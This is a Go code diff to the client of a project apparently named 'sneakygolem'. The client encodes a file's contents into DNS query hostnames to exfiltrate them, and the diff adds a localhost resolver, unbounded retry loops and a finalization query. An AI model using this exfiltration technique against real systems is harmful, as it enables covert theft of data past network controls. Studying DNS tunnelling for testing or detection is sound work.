@@ -1,13 +1,24 @@
 package client
 
 import (
+	"context"
 	"net"
 	"sneakygolem/internal/logger"
 	"sneakygolem/internal/protocol"
+	"time"
 )
 
 func queryDNS(host string) ([]string, error) {
-	ips, err := net.LookupHost(host)
+	r := &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{
+				Timeout: time.Millisecond * time.Duration(10000),
+			}
+			return d.DialContext(ctx, network, "127.0.0.1:53")
+		},
+	}
+	ips, err := r.LookupHost(context.Background(), host)
 	if err != nil {
 		return nil, err
 	}
@@ -45,12 +56,23 @@ func Run(filename string) error {
 		}
 		logger.Client.Info("Encoded payload:", "log", enc_payload)
 		_, err = queryDNS(enc_payload)
-		if err != nil {
-			logger.Client.Info("DNS query failed:", "log", err)
+		for err != nil {
+			logger.Client.Info("DNS query failed, trying again:", "log", err)
+			_, err = queryDNS(enc_payload)
 		}
 
 		counter++
-
+		if counter == protocol.GlobalSettings.MaxCount-1 {
+			logger.Client.Error("Counter exceeded maximum value")
+			break
+		}
 	}
+	logger.Client.Info("All payloads sent, sending finalization packet")
+	_, err = queryDNS(protocol.FinalizePayload(id))
+	for err != nil {
+		logger.Client.Info("Final DNS payload failed, trying again:", "log", err)
+		_, err = queryDNS(protocol.FinalizePayload(id))
+	}
+
 	return nil
 }
